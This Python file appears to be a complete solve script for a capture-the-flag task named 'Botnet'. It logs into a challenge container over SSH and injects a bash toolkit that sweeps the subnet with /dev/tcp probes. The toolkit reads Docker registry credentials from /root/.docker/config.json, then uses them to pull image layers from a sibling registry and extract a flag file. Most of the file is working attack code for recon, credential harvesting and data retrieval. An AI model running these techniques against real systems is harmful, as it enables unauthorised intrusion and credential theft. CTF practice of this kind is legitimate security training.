"""Solve the "Botnet" (Разбор ботнета) infra/pentest task end-to-end.

The task drops you into an SSH shell on an ephemeral, near-empty scratch
container (only ``bash`` and ``base64`` exist in ``$PATH`` — no ``cat``,
``ls``, ``curl``, ``python``, ``tar``, ``ip``...) and every reconnect boots a
*brand-new* container with a fresh IP and fresh registry tags. That forces
two design decisions mirrored here:

1. Everything (network recon, registry auth, blob extraction) must happen
   inside **one** continuous SSH session, driven as one interactive
   conversation rather than N separate ``ssh host cmd`` calls (the server
   rejects non-interactive command execution and non-tty piping outright).
2. All recon on the remote side is pure-bash: own IP/subnet are parsed from
   ``/proc/net/fib_trie`` and ``/proc/net/route`` (hex, little-endian), and
   hosts are probed with a *non-busy* ``/dev/tcp`` connect-with-timeout
   (a busy-poll loop burns the ``ulimit -t 10`` CPU-second budget and gets
   the whole session SIGXCPU-killed).

The remote sibling host turns out to run a stock Docker Registry v2 whose
Basic-auth credentials are sitting in ``/root/.docker/config.json`` (leftover
``docker login`` state). The registry catalog holds three images; one image's
build history shows a final ``COPY .../flag.txt`` layer. Every HTTP
round-trip (catalog / manifest / config-blob / flag-blob) is relayed back to
this side base64-encoded over the same bash primitive, so raw bytes never
have to survive as a NUL-unsafe bash variable; this script decodes each
response locally and parses it with the stdlib (``json`` for the registry
API bodies, ``tarfile`` for the final gzip'd layer).

Requires the ``ssh`` and ``sshpass`` binaries locally and network access to
the live challenge host (this will not work from a sandboxed environment
without egress to ``*.avitoctf.ru``).

Usage:
    BOTNET_PASS=... uv run python botnet/solve_botnet.py --host botnet-XXXX.avitoctf.ru
"""

from __future__ import annotations

import argparse
import json
import os
import re
import select
import subprocess
import sys
import tarfile
import time
from io import BytesIO

_START = "___RC_START_"
_END = "___RC_END_"


def _read_until(proc: subprocess.Popen[bytes], marker: bytes, timeout: float) -> bytes:
    """Read remote stdout until *marker* shows up (or timeout), return the buffer."""
    assert proc.stdout is not None
    buf = b""
    fd = proc.stdout.fileno()
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        remaining = deadline - time.monotonic()
        ready, _, _ = select.select([fd], [], [], min(0.5, max(remaining, 0)))
        if not ready:
            continue
        try:
            chunk = os.read(fd, 65536)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if marker in buf:
            break
    return buf


def _run(proc: subprocess.Popen[bytes], cmd: str, tag: str, timeout: float = 25.0) -> str:
    """Send *cmd* to the live session, wait for its sentinel, return decoded output.

    The session runs under ``ssh -tt`` (a real pty), so the terminal echoes every
    line we type back onto stdout. If we sent a plain ``echo <marker>``, the echoed
    *input* line would already contain the contiguous marker and ``_read_until``
    would return on it — before the command finished — leaking the command's real
    output (and the real sentinel) into the next call.

    Fix: emit the sentinel *split* as ``PREFIX<tag>"SUFFIX"``. The shell concatenates
    the two literals, so ``echo`` prints the contiguous marker, but the echoed input
    line keeps the ``"`` between the halves and never matches the contiguous marker.
    Only the command's genuine output does — so we always wait for the command to end.
    """
    assert proc.stdin is not None
    marker = f"{_START}{tag}{_END}"
    sentinel_cmd = f'echo {_START}{tag}"{_END}"'  # prints the contiguous marker
    proc.stdin.write(f"{cmd}\n{sentinel_cmd}\n".encode())
    proc.stdin.flush()
    raw = _read_until(proc, marker.encode(), timeout)
    text = raw.decode("utf-8", "replace")
    idx = text.find(marker)  # contiguous marker == echo's OUTPUT, not the input echo
    text = text[:idx] if idx != -1 else text
    cut = text.rfind(sentinel_cmd)  # drop the pty echo of the sentinel command line
    return text[:cut] if cut != -1 else text


# One-shot bash toolkit for the remote side: pure builtins only (no
# cat/ls/grep/awk/curl/python — see NOTES.md for why).
_BASH_TOOLKIT = r"""
hex2ip(){ local h=$1; printf '%d.%d.%d.%d' $((16#${h:6:2})) $((16#${h:4:2})) $((16#${h:2:2})) $((16#${h:0:2})); }
ip2int(){ local a b c d; IFS=. read -r a b c d <<<"$1"; echo $(( (a<<24)+(b<<16)+(c<<8)+d )); }
int2ip(){ local i=$1; echo "$(( (i>>24)&255 )).$(( (i>>16)&255 )).$(( (i>>8)&255 )).$(( i&255 ))"; }

alive(){
  local h=$1 p=$2 to=$3 cpid rc
  (exec 3<>"/dev/tcp/$h/$p") 2>/dev/null & cpid=$!
  read -t "$to"
  if kill -0 "$cpid" 2>/dev/null; then
    kill -9 "$cpid" 2>/dev/null; wait "$cpid" 2>/dev/null; return 2
  fi
  wait "$cpid" 2>/dev/null; rc=$?
  return $rc
}

http_get_b64(){
  # $1 host $2 port $3 path $4 extra-headers ("Key: val\r\n..." or empty)
  local h=$1 p=$2 path=$3 hdrs=$4
  exec 9<>"/dev/tcp/$h/$p"
  printf 'GET %s HTTP/1.1\r\nHost: %s\r\n%sConnection: close\r\n\r\n' "$path" "$h" "$hdrs" >&9
  base64 <&9
  exec 9<&- 9>&-
}

find_myip(){
  local line prev=""
  while IFS= read -r line; do
    case "$line" in *"host LOCAL"*) myip="${prev##*-- }";; esac
    prev="$line"
  done < /proc/net/fib_trie
}

find_net(){
  local iface dest gw flags refcnt use metric mask rest
  while IFS=$'\t' read -r iface dest gw flags refcnt use metric mask rest; do
    [ "$dest" = "Destination" ] && continue
    if [ "$gw" = "00000000" ] && [ "$dest" != "00000000" ]; then
      netbase=$(hex2ip "$dest"); netmask=$(hex2ip "$mask")
    fi
  done < /proc/net/route
}

find_sibling(){
  # non-busy /26-ish sweep for a host (other than us) with 5000/tcp open
  local nb nm bc h cand rc
  nb=$(ip2int "$netbase"); nm=$(ip2int "$netmask")
  bc=$(( nb | ((~nm) & 4294967295) ))
  h=$(( nb + 1 ))
  while [ "$h" -lt "$bc" ]; do
    cand=$(int2ip "$h")
    if [ "$cand" != "$myip" ]; then
      alive "$cand" 5000 1; rc=$?
      if [ "$rc" -eq 0 ]; then sib="$cand"; break; fi
    fi
    h=$(( h + 1 ))
  done
}

read_creds(){
  local cfg tmp
  cfg="$(< /root/.docker/config.json)"
  tmp="${cfg#*\"auth\":\"}"
  auth="${tmp%%\"*}"
}
"""


def _http(
    proc: subprocess.Popen[bytes], tag: str, host_var: str, path: str, auth_b64: str | None
) -> bytes:
    """Issue one raw HTTP/1.1 GET through the remote bash relay, return the raw response bytes."""
    hdrs = f"Authorization: Basic {auth_b64}\\r\\n" if auth_b64 else ""
    cmd = f'http_get_b64 "${host_var}" 5000 "{path}" "{hdrs}"'
    out = _run(proc, cmd, tag)
    b64 = re.sub(r"\s+", "", out)
    return _b64decode(b64)


def _b64decode(s: str) -> bytes:
    import base64

    pad = (-len(s)) % 4
    return base64.b64decode(s + "=" * pad)


def _split_http(raw: bytes) -> tuple[dict[str, str], bytes]:
    """Split a raw HTTP/1.1 response into (status-line/headers, body)."""
    sep = raw.find(b"\r\n\r\n")
    if sep == -1:
        return {}, raw
    head, body = raw[:sep].decode("latin-1"), raw[sep + 4 :]
    headers = dict(re.findall(r"^([\w-]+):\s*(.*)$", head, re.MULTILINE))
    return headers, body


def solve(host: str, user: str, password: str, timeout: float = 25.0) -> str:
    """Drive one SSH session end-to-end and return the recovered flag."""
    env = {**os.environ, "SSHPASS": password}
    proc = subprocess.Popen(
        [
            "sshpass",
            "-e",
            "ssh",
            "-tt",
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            f"{user}@{host}",
        ],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        env=env,
    )
    assert proc.stdin is not None
    assert proc.stdout is not None

    _read_until(proc, b"$", timeout)  # wait out the login banner / first prompt
    _run(proc, _BASH_TOOLKIT, "toolkit")
    _run(proc, "find_myip; find_net; read_creds", "setup")
    info = _run(proc, 'echo "myip=$myip net=$netbase/$netmask auth=$auth"', "info")
    print(f"[+] {info.strip()}", file=sys.stderr)

    _run(proc, "find_sibling", "sibling", timeout=90.0)
    sib_out = _run(proc, 'echo "sib=$sib"', "sib_echo")
    m = re.search(r"sib=(\S+)", sib_out)
    if not m or not m.group(1):
        raise RuntimeError("no sibling registry host found in the swept /26")
    print(f"[+] registry sibling: {m.group(1)}", file=sys.stderr)

    m_auth = re.search(r"auth=(\S+)", info)
    auth_b64 = m_auth.group(1) if m_auth else None

    _, body = _split_http(_http(proc, "catalog", "sib", "/v2/_catalog", auth_b64))
    repos = json.loads(body.decode())["repositories"]
    print(f"[+] registry catalog: {repos}", file=sys.stderr)

    for repo in repos:
        _, tags_body = _split_http(
            _http(proc, f"tags_{repo}", "sib", f"/v2/{repo}/tags/list", auth_b64)
        )
        tags = json.loads(tags_body.decode()).get("tags") or []
        if not tags:
            continue
        tag = tags[0]
        manifest_hdrs = (
            f"Authorization: Basic {auth_b64}\\r\\n"
            "Accept: application/vnd.docker.distribution.manifest.v2+json\\r\\n"
        )
        cmd = f'http_get_b64 "$sib" 5000 "/v2/{repo}/manifests/{tag}" "{manifest_hdrs}"'
        out = _run(proc, cmd, f"manifest_{repo}")
        _, mbody = _split_http(_b64decode(re.sub(r"\s+", "", out)))
        manifest = json.loads(mbody.decode())
        config_digest = manifest["config"]["digest"]
        layer_digests = [layer_["digest"] for layer_ in manifest["layers"]]

        _, cfg_body = _split_http(
            _http(proc, f"cfg_{repo}", "sib", f"/v2/{repo}/blobs/{config_digest}", auth_b64)
        )
        history = json.loads(cfg_body.decode()).get("history", [])
        if not any("flag" in h.get("created_by", "") for h in history):
            continue

        print(f"[+] flag layer found in image {repo!r}: {layer_digests[-1]}", file=sys.stderr)
        _, blob = _split_http(
            _http(proc, f"blob_{repo}", "sib", f"/v2/{repo}/blobs/{layer_digests[-1]}", auth_b64)
        )
        with tarfile.open(fileobj=BytesIO(blob), mode="r:gz") as tar:
            for member in tar.getmembers():
                if member.name.endswith("flag.txt"):
                    extracted = tar.extractfile(member)
                    assert extracted is not None
                    return extracted.read().decode().strip()

    raise RuntimeError("no repository in the catalog carried a flag.txt COPY layer")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--host", default=os.environ.get("BOTNET_HOST", "botnet-r7hjkp1j.avitoctf.ru")
    )
    parser.add_argument("--user", default=os.environ.get("BOTNET_USER", "bot"))
    parser.add_argument("--password", default=os.environ.get("BOTNET_PASS", ""))
    args = parser.parse_args()

    if not args.password:
        print("error: set --password or $BOTNET_PASS", file=sys.stderr)
        return 2

    flag = solve(args.host, args.user, args.password)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
